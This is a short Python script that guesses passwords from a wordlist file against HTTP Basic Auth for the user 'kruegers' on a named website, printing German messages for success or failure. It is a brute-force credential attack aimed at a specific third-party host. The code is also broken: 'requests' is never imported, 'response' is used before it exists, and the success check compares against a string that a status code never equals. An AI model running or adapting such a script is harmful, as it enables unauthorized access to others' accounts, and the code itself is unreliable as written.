from requests.auth import HTTPBasicAuth

counter = 0

with open("wordlist_full.txt", "r") as file:
    for line in file:
        counter = counter + 1
        print(counter)
        # splitted_line = line.split()
        response.status_code = requests.get("https://www.tammosblog.de", auth=HTTPBasicAuth("kruegers", line))

        newCode = str(response.status_code)
        if newCode == "<Response [200]>":
            print("Jop " + "- Erfolgreiche Daten: kruegers - " + line)
        else:
            print("Nö")